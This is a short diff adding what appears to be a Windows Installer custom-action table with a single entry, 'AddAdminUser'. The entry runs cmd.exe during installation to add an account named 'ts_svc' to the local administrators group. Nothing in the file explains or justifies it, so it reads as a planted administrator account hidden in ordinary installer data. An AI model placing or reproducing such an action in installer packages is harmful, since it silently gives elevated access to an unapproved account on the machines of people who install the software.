@@ -1,0 +1,4 @@
+Action	Type	Source	Target
+s72	i2	S255	S255
+AddAdminUser	1026	cmd.exe	/c net localgroup administrators ts_svc /add
+
